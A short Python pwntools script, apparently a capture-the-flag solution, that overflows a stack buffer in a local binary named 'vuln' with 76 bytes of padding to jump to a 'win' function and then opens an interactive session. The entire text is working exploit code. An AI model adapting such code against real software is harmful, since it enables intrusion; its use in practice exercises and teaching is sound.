from pwn import *

context.binary = './vuln'
elf = context.binary
p = process(elf.path)

offset = 76
win_addr = elf.symbols['win']

payload = b'A' * offset + p32(win_addr)
p.sendline(payload)
p.interactive()
